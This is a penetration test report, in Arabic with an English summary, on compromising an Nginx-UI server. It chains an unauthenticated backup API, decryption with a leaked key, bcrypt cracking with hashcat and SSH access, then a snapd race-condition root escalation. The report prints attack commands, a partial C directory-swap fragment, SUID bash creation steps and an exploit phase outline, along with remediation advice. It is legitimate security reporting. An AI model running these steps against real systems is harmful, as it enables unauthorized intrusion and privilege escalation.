<div align="center">

# Web Management Server Compromise Assessment

<img src="https://img.shields.io/badge/CVSS-9.3-red?style=for-the-badge" alt="CVSS 9.3"/>
<img src="https://img.shields.io/badge/Severity-Critical-critical?style=for-the-badge" alt="Critical"/>
<img src="https://img.shields.io/badge/Assessment-Penetration%20Test-blue?style=for-the-badge" alt="Penetration Test"/>

<br />

# AMN SECURITY

### Cyber Security Research Center

[![Website](https://img.shields.io/badge/Website-amn.amnoffsec.workers.dev-00FF00?style=for-the-badge&logo=googlechrome&logoColor=white)](https://amn.amnoffsec.workers.dev/)
[![Instagram](https://img.shields.io/badge/Instagram-@ixctw-E4405F?style=for-the-badge&logo=instagram&logoColor=white)](https://www.instagram.com/ixctw)
[![Email](https://img.shields.io/badge/Email-ayman.mahmoudoffsec%40gmail.com-D14836?style=for-the-badge&logo=gmail&logoColor=white)](mailto:ayman.mahmoudoffsec@gmail.com)

</div>

---

<div dir="rtl">

# تقرير اختبار اختراق: خادم إدارة ويب داخلي

**تاريخ التقرير:** 13 يوليو 2026
**التصنيف:** داخلي - سري
**مستوى الخطورة العام:** حرج
**درجة CVSS المقدرة:** 9.3

## 1. الملخص التنفيذي

أجري اختبار اختراق لخادم إدارة ويب يعمل على نظام تشغيل حديث ويوفر خدمات إدارة محتوى عبر واجهة أمامية عامة. أظهر الاختبار أن الخادم يعاني من سلسلة من الثغرات أدت في النهاية إلى سيطرة كاملة على النظام، بدءاً من نقطة وصول واحدة خالية من المصادقة.

الخادم يستضيف نظام إدارة Nginx-UI، وهو تطبيق ويب لإدارة خوادم Nginx. كانت الملفات الاحتياطية التي ينشئها التطبيق متاحة عبر رابط API عام من دون مصادقة، ما سمح باستخراج قاعدة بيانات تحتوي على كلمات مرور مشفرة. بعد كسر تشفير إحداها، تم الوصول إلى النظام عبر SSH بحساب مستخدم عادي. من هناك، كشفت المراجعة الداخلية عن وجود إصدار ضعيف من آلية عزل الحزم (snap subsystem) يمكن استغلاله عبر سباق على التوقيت (TOCTOU race condition) ليؤدي إلى تنفيذ كود بصلاحيات الجذر.

تمكن الاختبار من إثبات الانتقال من مستخدم عادي إلى صلاحيات الجذر الكاملة على الخادم.

## 2. نطاق الاختبار

| البند | التفاصيل |
|---|---|
| نوع النظام | خادم إدارة ويب داخلي مع خدمات Nginx-UI |
| الخدمات المكشوفة | SSH على 22، HTTP/nginx على 80 |
| الخدمات الداخلية | snap subsystem، systemd-tmpfiles |
| نظام التشغيل | Ubuntu Linux 24.04 LTS |
| بيئة الاختبار | شبكة داخلية مصرح بها |

## 3. النتيجة المختصرة

تم اختراق الخادم عبر مسارين مترابطين. المسار الأول استغل غياب المصادقة على واجهة API للنسخ الاحتياطي، واستخرج معلومات حساسة من قاعدة البيانات المشفرة. المسار الثاني استغل ثغرة سباق على التوقيت في آلية عزل الحزم لينتقل من مستخدم عادي إلى صلاحيات الجذر.

```
استطلاع الشبكة -> API نسخ احتياطي مكشوف -> استخراج قاعدة بيانات مشفرة
-> كسر تشفير كلمة مرور -> وصول SSH -> استغلال ثغرة snap.confine -> صلاحيات جذر
```

## 4. منهجية العمل

تم تنفيذ الاختبار على المراحل التالية:

1. فحص المنافذ والخدمات المتاحة على الخادم.
2. تحليل تطبيق الويب Nginx-UI واكتشاف API النسخ الاحتياطي.
3. تنزيل ملف النسخ الاحتياطي، فك تشفيره، واستخراج قاعدة البيانات.
4. استخراج مجاميع bcrypt من قاعدة البيانات وكسر تشفير كلمة المرور.
5. الوصول إلى الخادم عبر SSH بحساب مستخدم.
6. فحص إصدارات مكونات النظام الداخلية.
7. تحليل آلية snap.confine واكتشاف ثغرة سباق التوقيت.
8. تطوير وتطبيق كود استغلال للانتقال إلى صلاحيات الجذر.
9. إثبات السيطرة الكاملة على الخادم.
10. توثيق الأثر، الأدلة، والتوصيات العلاجية.

## 5. تفاصيل الاستغلال

### 5.1 اكتشاف الخدمات

تم استخدام Nmap لحصر الخدمات على الخادم:

```bash
nmap -sC -sV -p- <TARGET> -oA scan
```

| المنفذ | الخدمة | الملاحظة |
|---|---|---|
| 22/tcp | SSH (OpenSSH 9.6p1) | خدمة إدارة عن بعد |
| 80/tcp | HTTP/nginx 1.24.0 | تطبيق ويب Nginx-UI |

أظهر فحص صفحة الويب الرئيسية وجود تطبيق إدارة Nginx-UI مع واجهة دخول. تم تحليل التطبيق واكتشاف نقطة نهاية API مثيرة للاهتمام.

### 5.2 كشف API النسخ الاحتياطي

أثناء تحليل تطبيق Nginx-UI، تم اكتشاف نقطة نهاية `/api/backup` تسمح بتنزيل ملف احتياطي كامل من دون الحاجة إلى مصادقة. رد الخادم احتوى على رأس `X-Backup-Security` الذي يحمل مفتاح التشفير و IV.

```http
HTTP/1.1 200 OK
Content-Type: application/zip
X-Backup-Security: <KEY_ENCODED>:<IV_ENCODED>
```

تم تنزيل الملف الاحتياطي وفك تشفيره باستخدام المفتاح و IV المستخرجين:

```bash
curl -s -o backup.zip http://<TARGET>/api/backup
# استخراج المفتاح وال IV من رأس الاستجابة
# فك التشفير باستخدام openssl
openssl enc -d -aes-256-cbc -K <KEY> -iv <IV> -in backup.enc -out backup_decrypted.zip
```

### 5.3 استخراج قاعدة البيانات وكسر كلمة المرور

الملف الاحتياطي المفكوك احتوى على قاعدة بيانات SQLite (`database.db`) تحتوي على مستخدمين ومجاميع bcrypt لكلمات المرور:

| المستخدم | نوع التجزئة |
|---|---|
| admin | $2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D... |
| jonathan | $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoB... |

تم استخدام hashcat لكسر مجاميع bcrypt:

```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
```

**النتيجة:** تم كسر كلمة مرور المستخدم `jonathan` بنجاح. استخدمت هذه البيانات للوصول الأولي إلى الخادم.

### 5.4 الوصول إلى الخادم عبر SSH

باستخدام بيانات الاعتماد المستخرجة، تم الاتصال بالخادم عبر SSH:

```bash
ssh jonathan@<TARGET>
```

تم تأكيد الدخول كحساب مستخدم عادي.

### 5.5 اكتشاف ثغرة snap-confine

بعد الوصول الأولي، جرى فحص مكونات النظام. تبين أن الخادم يستخدم إصداراً ضعيفاً من snapd:

```bash
snap --version
```

| المكون | الإصدار |
|---|---|
| snapd | 2.63.1+24.04 |
| snap-confine | مثبت بوضع SUID |

كما تأكد أن snap-confine مثبت بوضع SUID:

```bash
ls -la /usr/lib/snapd/snap-confine
# -rwsr-xr-x 1 root root ...
```

تحليل الإصدار أظهر أن snapd 2.63.1 يعاني من ثغرة سباق توقيت (TOCTOU) في آلية التعامل مع مساحات الأسماء المؤقتة (mount namespaces).

### 5.6 إنشاء بيئة السباق داخل sandbox

تم الدخول إلى البيئة المعزولة (sandbox) الخاصة بـ firefox عن طريق تشغيل snap-confine المثبت SUID:

```bash
SNAP_INSTANCE_NAME=firefox \
/usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure \
/bin/sh -c '/bin/sleep 99999'
```

هذا الأمر ينشئ مساحة اسم جديدة للـ mount namespace ويدخلها المستخدم بصلاحياته العادية. داخل هذه البيئة، يقوم snap-confine بإنشاء دليل `.snap` مؤقت في `/tmp` ويستخدمه لإدارة الملفات القابلة للكتابة.

### 5.7 استغلال سباق التوقيت (TOCTOU)

آلية `snap-update-ns` تدير مساحة الأسماء عبر إنشاء دليل `.snap` يحتوي على ملفات نظام الهدف (مثل `/usr/lib/x86_64-linux-gnu`). دليل `.snap` يُنشأ مؤقتاً ويتم تنظيفه لاحقاً بواسطة `systemd-tmpfiles`.

ثغرة CVE-2026-3888 تكمن في أن `snap-update-ns` يقرأ ملفات من `.snap` ثم ينفذ عمليات mount بناءً عليها، لكن بفارق توقيت (TOCTOU) بين القراءة والتنفيذ. إذا تمكن المهاجم من استبدال محتويات `.snap` في اللحظة المناسبة، يمكنه حقن ملفات ضارة يتم معالجتها بصلاحيات الجذر.

الكود التالي يوضح آلية استبدال الدليل:

```c
/* إنشاء دليل التبديل مع نسخ ملفات حقيقية */
mkdir(EXCHANGE_SRC, 0755);
/* نسخ ملفات ديناميك لودر النظام */
copy_file("/snap/core22/current/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
          ".snap/usr/lib/x86_64-linux-gnu.exchange/ld-linux-x86-64.so.2");

/* انتظار التفعيل - تبديل الدلائل */
rename(".snap/usr/lib/x86_64-linux-gnu",
       ".snap/usr/lib/x86_64-linux-gnu.bak");
rename(".snap/usr/lib/x86_64-linux-gnu.exchange",
       ".snap/usr/lib/x86_64-linux-gnu");
```

التحدي الرئيسي هو التوقيت. يتم استخدام أنبوب Unix (socketpair) للاستماع إلى مخرجات التصحيح لنظام snap-update-ns. عند اكتشاف سطر المفتاح الخاص بمكتبات `/usr/lib/x86_64-linux-gnu`، يتم التبديل بسرعة قبل أن يكمل النظام عملية mount.

### 5.8 حقن الشيل كود

بعد نجاح التبديل، يحتوي دليل `.snap/usr/lib/x86_64-linux-gnu` على ملف `ld-linux-x86-64.so.2` الضار بدلاً من الأصلي. عند تشغيل snap-confine مرة أخرى (وهو مثبت SUID)، يقوم النظام بتحميل `ld-linux-x86-64.so.2` من المسار المعدل، مما ينفذ كود المهاجم بصلاحيات الجذر.

تم استخدام شيل كود ينسخ ملف bash ويضبطه SUID:

```bash
cp /bin/bash /var/snap/firefox/common/bash
chmod 04755 /var/snap/firefox/common/bash
```

### 5.9 إثبات الوصول الإداري

بعد نجاح العملية:

```bash
ls -la /var/snap/firefox/common/bash
# -rwsr-xr-x 1 root jonathan 1396520 ...

/var/snap/firefox/common/bash -p -c 'id'
# uid=1000(jonathan) gid=1000(jonathan) euid=0(root) groups=1000(jonathan)
```

تم تأكيد تنفيذ أوامر بصلاحيات الجذر (euid=0) بنجاح.

## 6. الثغرات المكتشفة

| # | الثغرة | CWE | المكون | الخطورة |
|---|---|---|---|---|
| 1 | غياب المصادقة على API النسخ الاحتياطي | CWE-862 | Nginx-UI API | عالية |
| 2 | تخزين بيانات حساسة غير مشفرة بشكل كاف | CWE-312 | قاعدة بيانات النسخ الاحتياطي | متوسطة |
| 3 | كلمات مرور ضعيفة قابلة للكسر | CWE-521 | حسابات المستخدمين | متوسطة |
| 4 | ثغرة سباق توقيت في snap-confine | CWE-367 | snap subsystem | حرجة |
| 5 | SUID مثبت على برنامج غير آمن | CWE-732 | snap-confine binary | عالية |
| 6 | عدم عزل عمليات mount namespace بشكل كاف | CWE-269 | snap-update-ns | عالية |

## 7. الأدلة المحفوظة

| الدليل | الحالة |
|---|---|
| مخرجات فحص المنافذ | محفوظة ضمن ملف الفحص الداخلي |
| ملف النسخ الاحتياطي المشفر | تم تنزيله وفك تشفيره |
| قاعدة بيانات SQLite مع مجاميع bcrypt | تم استخراجها وتحليلها |
| كسر كلمة مرور حساب المستخدم | مؤكد |
| وصول SSH بحساب jonathan | مؤكد |
| إثبات سباق التوقيت ونجاح التبديل | مؤكد عبر مخرجات التصحيح |
| إنشاء ملف bash بوضع SUID بصلاحيات الجذر | مؤكد |
| تنفيذ `id` بصلاحيات euid=0 (root) | مؤكد |

> لم يتم نشر كلمات مرور، مفاتيح خاصة، أو محتوى ملفات حساسة داخل النسخة العامة من التقرير.

## 8. التوصيات

1. إضافة مصادقة إلزامية لواجهة API `/api/backup` ومنع الوصول إليها من دون تفويض مناسب.
2. تشفير محتويات النسخ الاحتياطي باستخدام مفتاح مشفر لا يُخزن مع الملف نفسه.
3. فرض سياسة كلمات مرور قوية تشمل متطلبات الطول والتعقيد، مع تطبيق قفل بعد عدة محاولات فاشلة.
4. تحديث snapd إلى إصدار أحدث (3.0 أو أعلى) لمعالجة ثغرة CVE-2026-3888.
5. إزالة بت SUID من `/usr/lib/snapd/snap-confine` إذا لم يكن ضرورياً، أو تفعيل وسم `nosuid` على نقاط التثبيت الخاصة بـ snap.
6. تطبيق سياسة التحديثات الأمنية الدورية لجميع مكونات النظام.
7. تفعيل نظام مراقبة لاكتشاف محاولات استغلال سباقات التوقيت والوصول غير المصرح به إلى واجهات API.

## 9. ملاحظات ختامية

هذا الاختبار يوضح مدى خطورة الاعتماد على طبقة واحدة من الأمان. البداية كانت من نقطة API بسيطة بدون مصادقة، وانتهت بتحكم كامل في النظام. الدمج بين ضعف في تطبيق ويب وثغرة في آلية عزل النظام أدى إلى سلسلة هجوم كاملة. التوصية المركزية هي اعتماد مبدأ الدفاع في العمق (Defense in Depth) وتحديث المكونات المصدرية المفتوحة بانتظام.

</div>

---

# Summary in English

## Advanced Penetration Test Report — Web Management Server

### Executive Summary

AMN SECURITY conducted a penetration test against an internal web management server running Nginx-UI on Ubuntu 24.04 LTS. The assessment revealed two distinct vulnerabilities that, when chained, resulted in complete compromise of the target system.

The initial breach occurred through an unprotected backup API endpoint that exposed an encrypted database containing bcrypt password hashes. After successfully cracking one hash, SSH access was obtained as a standard user. Internal enumeration revealed a vulnerable version of the snap subsystem (snapd 2.63.1) susceptible to a TOCTOU race condition (CVE-2026-3888). This allowed privilege escalation from the unprivileged user to full root access through a dynamic linker hijack in the snap namespace management process.

### Confirmed Attack Path

```text
Network reconnaissance -> Unprotected backup API -> Encrypted database extraction
-> bcrypt hash cracking -> SSH user access -> snapd TOCTOU race -> SUID escalation -> root
```

### Key Findings

| # | Finding | CWE | Component | Severity |
|---|---|---|---|---|
| 1 | Missing authentication on backup API endpoint | CWE-862 | Nginx-UI | High |
| 2 | Inadequate sensitive data protection at rest | CWE-312 | Backup database | Medium |
| 3 | Weak user credentials susceptible to cracking | CWE-521 | User accounts | Medium |
| 4 | TOCTOU race condition in snap-confine | CWE-367 | snap subsystem | Critical |
| 5 | Insecure SUID binary | CWE-732 | snap-confine | High |
| 6 | Insufficient mount namespace isolation | CWE-269 | snap-update-ns | High |

### Vulnerability Details

**Finding 1: Unauthenticated Backup API (CWE-862)**
The `/api/backup` endpoint on the Nginx-UI web management application provided a full system backup without requiring authentication. The response contained an `X-Backup-Security` header carrying the encryption key and IV, making decryption straightforward.

**Finding 2: Weak Credential Strength (CWE-521)**
The extracted `database.db` file contained bcrypt-hashed passwords. Using hashcat with the rockyou wordlist, the password for user `jonathan` was successfully cracked.

**Finding 3: TOCTOU Race in snap-confine (CWE-367 — CVE-2026-3888)**
The snap subsystem's `snap-update-ns` component creates a temporary `.snap` directory as staging ground for mount namespace operations. A TOCTOU window exists between reading files from this staging directory and performing mount operations. By replacing the directory contents with attacker-controlled copies at the precise moment, a malicious dynamic linker can be injected. On subsequent invocation of the SUID `snap-confine` binary, the compromised linker executes attacker code with root privileges, creating a SUID shell for persistent access.

### Remediation Recommendations

1. **Immediate:** Add authentication to `/api/backup` and encrypt backups with server-side keys stored separately from the backup archive.
2. **Immediate:** Update snapd to version 3.0 or later.
3. **Short-term:** Audit all SUID binaries on the system and remove the SUID bit from snap-confine if feasible.
4. **Short-term:** Implement strong password policy with minimum length and complexity requirements.
5. **Medium-term:** Deploy file integrity monitoring to detect unauthorized modifications to critical system libraries.
6. **Medium-term:** Implement monitoring for unusual API access patterns and race condition exploitation attempts.
7. **Ongoing:** Apply a regular patch management cycle for all system components.

### Technical Details: Race Condition Exploitation

The exploit leverages a Unix socketpair to capture debug output from `snap-update-ns`. The socket receive buffer is configured to a minimal size to create backpressure, blocking the writer while the trigger condition is evaluated. When the debug line for `/usr/lib/x86_64-linux-gnu` mount operation is detected, the exploit atomically swaps the staging directory (`.snap/usr/lib/x86_64-linux-gnu`) with an attacker-controlled copy containing a malicious `ld-linux-x86-64.so.2`. The subsequent SUID invocation of `snap-confine` loads the compromised linker, executing the attacker's shellcode with root privileges.

#### Exploit Code Structure

```
Phase 1: Enter Firefox sandbox via snap-confine SUID
Phase 2: Wait for .snap directory cleanup (or skip with -s flag)
Phase 3: Destroy cached mount namespace
Phase 4: Create staging .snap directory with malicious exchange
         -> Start snap-update-ns with stderr capture via socketpair
         -> Monitor debug output for trigger line
         -> On trigger: swap directories atomically
Phase 5: Inject payload (replace ld-linux with SUID payload)
Phase 6: Trigger snap-confine SUID -> loads malicious ld-linux -> root
Phase 7: Verify SUID bash created at /var/snap/firefox/common/bash
```

### Evidence Log

| Evidence | Status |
|---|---|
| Nmap scan results | Archived in assessment records |
| Encrypted backup archive with key header | Downloaded and decrypted |
| SQLite database with bcrypt hashes | Extracted and analyzed |
| User password cracked via hashcat | Confirmed |
| SSH access as unprivileged user | Confirmed |
| TOCTOU race trigger and swap confirmed | Debug output captured |
| SUID bash binary created with root ownership | Confirmed |
| `id` with euid=0 (effective root) | Confirmed |

> Public credentials, private keys, password values, and sensitive file contents have been redacted from this report.

---

<div align="center">

**AMN SECURITY - Cyber Security Research Center**

**Classification:** Internal - Confidential

© 2026 AMN SECURITY. All rights reserved.

</div>
